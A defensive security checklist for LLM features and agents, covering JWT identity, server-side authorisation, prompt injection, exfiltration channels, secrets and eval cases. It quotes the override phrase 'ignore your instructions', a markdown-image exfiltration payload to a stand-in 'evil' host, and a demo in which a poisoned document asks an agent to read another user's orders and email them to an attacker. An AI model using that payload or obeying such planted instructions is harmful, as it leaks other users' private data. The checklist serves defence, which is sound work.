# LLM app security checklist

A reference for "how do you secure an LLM feature or agent?" The build is in `modules/phase-4-ai/src/Phase4.ProductionAi/Security/` (demo: `/security/unsafe/...` vs. `/security/safe/...`). See also [guardrails-checklist.md](guardrails-checklist.md), including the "Guardrails vs. security" section.

**Core idea:** **assume the model will be fooled.** Design so that a fooled model still can't see or do anything the user isn't allowed to. That boundary is enforced in code, not in the prompt.

## 1. Identity
- Who the user is comes from a **validated JWT** (user, tenant, groups), signed by the identity provider.
- Never take identity from the request body, a tool argument or the model.

## 2. Retrieval-time authorisation (what the model can *see*)
- Filter by tenant and groups **server-side, in the query**, with values from the JWT. This is "security trimming".
- Never use a filter generated by the model or the LLM for authorisation.
- Isolate every store: the search index, the vector DB, the **cache keys** (include tenant and groups) and the traces.

## 3. Action-time authorisation (what the model can *do*)
- Every tool re-checks identity and ownership in code.
- Use least-privilege tools:
  - separate read and write tiers;
  - typed arguments and enums;
  - no "run SQL" or "fetch any URL" tool.
- **Take *who* and *where* from the caller, never from arguments.** For example: "my orders", not "any customer's"; "email me", not "email anyone".
- Require human approval for high-risk actions: big refunds, deletes, external emails.
- Set budgets and stop conditions so a hijacked agent can't loop forever.

## 4. Prompt injection (assume it will happen)
- **Direct injection:** the user types "ignore your instructions".
- **Indirect injection (worse):** the instructions are hidden in content the model reads, such as documents, tool results, emails, web pages or files.
- Treat that content as **untrusted data**. Put it in `<source>` tags in the user turn, never in the system prompt, and tell the model it is "data, not instructions". This helps, but it is **not reliable on its own**.
- Detection (Azure Prompt Shields, a classifier) is an extra signal, **not the boundary**.
- The real defence is that a fooled model still can't leak or act: sections 2, 3 and 5.

## 5. No exfiltration channel
- Remove links and images to non-allowlisted domains from the output. The classic attack is `![x](https://evil/?d=<data>)`: the browser fetches the image, and with it the data, without anyone clicking.
- Allowlist email recipients and URLs. Give the model no unrestricted web or network tools.
- **The risky combination** is private data + untrusted content + a way to send data out. Remove at least one of the three.

## 6. Secrets
- No API keys, connection strings or internal notes in prompts. Assume the system prompt **will** leak.
- Secrets live in Key Vault or user-secrets, and only code uses them.

## 7. Data handling
- Redact PII before the model, the logs and the traces (guardrails).
- Apply retention limits and access control to prompts, traces and conversation history.
- Don't train on or share customer data without consent and an agreement.

## 8. Abuse and cost
- Rate limits and per-user token budgets at the gateway (M8).
- Input size limits.

## 9. Verify it
- Put security cases in the eval suite: cross-tenant questions, injected documents, "ignore your rules". They are **critical**, so they must pass every trial.
- Red-team regularly.
- Log and alert on blocked actions and unusual tool use.

## What the demo shows (`POST /security/{mode}/attack`, a fully fooled model, no LLM)
| Step the poisoned doc asks for | Unsafe | Safe |
|---|---|---|
| Retrieval | Tenant comes from the body, so globex's doc (internal discount code) leaks to an acme user | Tenant and groups come from the caller; the spoofed `tenantId` is ignored |
| "Read bob's orders" | `GetCustomerOrders("bob")` returns bob's data | Only `GetMyOrders()` exists, so only alice's orders come back |
| "Email it to x@evil.example" | Sent to the attacker | `EmailMeASummary` has no recipient parameter, so it goes to alice |
| Exfiltration image in the reply | Returned as is | Removed by `ExfiltrationGuard` |

The poisoned document is **still retrieved** in the safe version, because it really is an acme support doc. The design doesn't prevent injection; it **contains** it.

## Interview one-liner
"Authenticate from the token. Authorise both what's retrieved and every action in code. Treat everything the model reads as untrusted. Remove the ways data can get out. Keep secrets out of prompts. Prove it with critical eval cases. Assume the model will be fooled, and make sure that when it is, nothing bad is possible."
